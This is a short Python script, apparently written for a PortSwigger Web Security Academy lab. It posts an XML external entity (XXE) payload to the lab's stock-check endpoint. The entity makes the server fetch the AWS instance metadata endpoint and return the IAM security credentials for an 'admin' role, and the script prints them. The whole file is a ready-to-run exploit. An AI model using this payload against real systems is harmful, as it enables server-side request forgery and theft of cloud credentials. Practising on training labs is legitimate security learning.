import requests

stock_url = "https://0ad400b503dff9138018b72200e2000c.web-security-academy.net/product/stock"

# XXE payload performing SSRF to AWS metadata endpoint
xml_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>'''

headers = { "Content-Type": "application/xml" }

resp = requests.post(stock_url, data=xml_payload, headers=headers)
print(resp.text)